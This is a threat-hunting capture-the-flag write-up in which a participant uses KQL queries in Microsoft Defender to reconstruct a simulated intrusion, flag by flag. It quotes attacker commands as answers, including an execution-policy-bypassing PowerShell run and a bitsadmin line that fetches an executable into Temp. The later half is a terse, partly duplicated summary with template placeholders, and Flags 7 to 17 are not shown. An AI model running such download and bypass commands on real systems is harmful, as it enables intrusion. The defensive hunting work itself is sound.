 # 🎯 Threat-Hunting-Scenario-Lurker

 <img width="400" src="https://github.com/user-attachments/assets/834efe0f-4b99-4196-8f8a-9e7cc6b3551e" alt="computer login screen, person lurking"/>

**Participant:** Luka Groff

**Date:** 9 July 2025

## Platforms and Languages Leveraged

**Platforms:**

* Microsoft Defender for Endpoint (MDE)
* Log Analytics Workspace

**Languages/Tools:**

* Kusto Query Language (KQL) for querying device events, registry modifications, and persistence artifacts
* Native Windows utilities: `powershell.exe`, `cmd.exe`, `schtasks.exe`, `csc.exe`

---


 # 📖 **Scenario**
 
The last incident was supposed to be over. One machine compromised, the attacker cut off before they could spread — or so we were told.

But something doesn’t sit right.

A new device started acting strangely. At first glance, it mirrored the earlier compromise: same tools, same timing, same surgical precision. Only this time, the logs were cleaner. Too clean. And yet, traces remained — scattered like breadcrumbs that weren’t meant to be found, or perhaps were meant to be followed.

Someone wants us to see this.

What if the first breach was a smokescreen? A proof of concept? What if this is the real operation?

Some say it’s just a red team op. Others whisper it’s something more — a buried framework that’s been lying dormant, waiting for its second trigger.

You’ve been given full access. But not the full story.

🎯 Your job is simple: Prove what really happened.

🧭 Follow the signs. Trust the data. Question everything.

Good luck, hunter.



## Starting Point

Before you officially begin the flags, you must first determine where to start hunting. Identify where to start hunting with the following intel given: 
1. Days active 2-3 days
2. Executions from Temp folder
3. 15th of June

Identify the first machine to look at*

Query used:
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-06-12T00:00:00Z) .. datetime(2025-06-19T00:00:00Z))
| where FolderPath contains "Temp"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Count=count() by DeviceName
| project DeviceName, FirstSeen, LastSeen, ActiveDays = datetime_diff("day", LastSeen, FirstSeen), Count
| where ActiveDays >= 1 and ActiveDays <= 3
| order by FirstSeen asc
```

🧠 **Thought process:** Since the hint was 15th of June, my actual time is different, so I had to look for a machine on 15th of June UTC time. I extended the First seen timestamp to exclude the machines that were there before the 15th of June, I then checked the names and the first and last seen dates, and it led me to either michaelvm or employee- 1257. The rest were the usual names I am used to seeing in the logs.

<img width="600" src="https://github.com/user-attachments/assets/56e6b6a3-620c-4f35-845c-647c91fed247"/>

**Answer: michaelvm**

---

## 🟩 Flag 1 – Initial PowerShell Execution Detection

**Objective:**

Pinpoint the earliest suspicious PowerShell activity that marks the intruder's possible entry.

**What to Hunt:**

Initial signs of PowerShell being used in a way that deviates from baseline usage.

**Thought:**

Understanding where it all began helps chart every move that follows. Look for PowerShell actions that started the chain.

**Hint:**

1. File path

 🕵️ **Identify the first suspicious ps1 execution command**

Query used:
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "ps1"
| project Timestamp, ProcessCommandLine, FileName, FolderPath
| order by Timestamp asc
```

🧠 **Thought process:** The hint of ps1 execution gave away a lot, as I just looked at the target machine's ps1 executions in the process command line that deviated from the usual noise creation. What I found was not just the answer to this flag, but also a clue for a future step, where the attacker migrated. The first execution was at 2025-06-16T05:38:07.9685093Z.

<img width="600" src="https://github.com/user-attachments/assets/f988216e-8ee9-4db4-9343-5916ab6e9560"/>

**Answer: "powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"**

---

## 🟩 Flag 2 – Reconnaissance Script Hash

**Objective:**

Identify reconnaissance stage binary.

**What to Hunt:**

Local recon indicators

**Thought:**

Recon always comes early — it’s the intruder mapping their new terrain.

 🕵️ **Identify the standard hashed value associated with the recon attempt**

Query used:
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "whoami"
| project Timestamp, FileName, ProcessCommandLine, SHA256, FolderPath, InitiatingProcessFileName
| order by Timestamp asc
```

🧠 **Thought process:** I figured, since the first thing you do once you get remote access is type whoami, so i searched for that command in the command line. I found a command 'whoami' of which SHA256 was the right answer, BUT upon inspecting the SHA256 for actual clues of recon i used the KQL below to find a lot of clues for example commands like whoami, schtasks and deleting evidence of onedrivesetup. The evidence of the attacker being present was overwhelming.

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where SHA256 == "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
| project Timestamp, ProcessCommandLine, FileName
| order by Timestamp asc
```

<img width="600" src="https://github.com/user-attachments/assets/b6231c78-0a03-4bd2-813b-ac7b9e82eb37"/>

**Answer: SHA256 = badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0**

---

## 🟩 Flag 3 – Sensitive Document Access

**Objective:**

Reveal the document accessed/staged by attacker.

**What to Hunt:**

Access to meetings related directories or confidential crypto data.

**Thought:**

The attacker’s interest in financials reveals their motive — follow the money trail.

**Hint:**

1. Board

 🕵️ **Provide the targeted file **

Query used:
```
DeviceEvents
| where DeviceName == "michaelvm"
| where FolderPath contains "board"
| where ActionType == "SensitiveFileRead"
```

🧠 **Thought process:** I used the hint Board well in this case. I knew the SensitiveFileRead is a good way of finding out which file was accessed, if it was important. Then i tried to query the Board for file name and folder path as well as process command line, of which the last two were a good hit. 


<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>

**Answer: QuarterlyCryptoHoldings.docx**

---













🟩 Flag 3 – Sensitive Document Access
	•	What to Hunt: Access to sensitive files (Board/Financials).
	•	Answer:
	•	QuarterlyCryptoHoldings.docx at 2025-06-16T05:59:03.478914Z
	•	Query Used:
	•	DeviceEvents | where DeviceName == "michaelvm" | where FolderPath contains "board" | where ActionType == "SensitiveFileRead"

🟩 Flag 4 – Last Manual Access to File
	•	What to Hunt: Last file open timestamp of the sensitive doc.
	•	Answer:
	•	2025-06-16T06:12:28.2856483Z
	•	Query Used: (Same as Flag 3)

🟩 Flag 5 – LOLBin Usage: bitsadmin
	•	What to Hunt: Use of bitsadmin to download payload.
	•	Answer:
	•	"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe at 2025-06-16T05:59:57.395276Z
	•	Query Used:
	•	DeviceProcessEvents | where DeviceName == "michaelvm" | where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z)) | where FileName contains "bitsadmin.exe" | order by Timestamp asc

🟩 Flag 6 – Suspicious Payload Deployment
	•	What to Hunt: Dropped .exe payload in unusual folder.
	•	Answer:
	•	ledger_viewer.exe at 2025-06-16T06:15:37.0446648Z
	•	Query Used:
	•	DeviceFileEvents | where DeviceName == "michaelvm" | where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z)) | where FileName endswith ".exe" | where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\", "\\Users\\Public\\") | project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp asc

(continues for Flags 7 through 17 in same pattern)

📅 Timeline Summary
	•	Initial Access – PowerShell from Temp on michaelvm
	•	Reconnaissance – Network/Host discovery
	•	Sensitive Data Access – Accessed QuarterlyCryptoHoldings.docx
	•	Payload Download – Using bitsadmin
	•	Execution – HTA via mshta
	•	Persistence – Registry Run key + Scheduled Task
	•	Lateral Movement – Pivot to centralsrvr
	•	Exfiltration – Pastebin, Dropbox endpoints
	•	Anti-Forensics – PowerShell downgrade and log wiping

✅ Conclusion
The attacker leveraged native tools and LOLBins to evade detection, accessed high-value documents, and stealthily exfiltrated them while maintaining persistence. The clean logs indicate deliberate obfuscation and anti-forensic effort.

🛡️ Recommendations
	•	Block LOLBins like bitsadmin, mshta via AppLocker or WDAC
	•	Enable script block logging and AMSI
	•	Monitor for PowerShell downgrade attempts (-Version 2)
	•	Watch for registry changes in autorun paths
	•	Alert on suspicious scheduled task creation
	•	Monitor public cloud uploads (e.g. Dropbox, Pastebin)

🧾 Attribution
Threat simulation: Red Team Exercise Analysis: [Your Name] 📁 Repo: github.com/yourhandle/threat-hunting

“Attackers hide in noise. But sometimes, they hide in silence.”
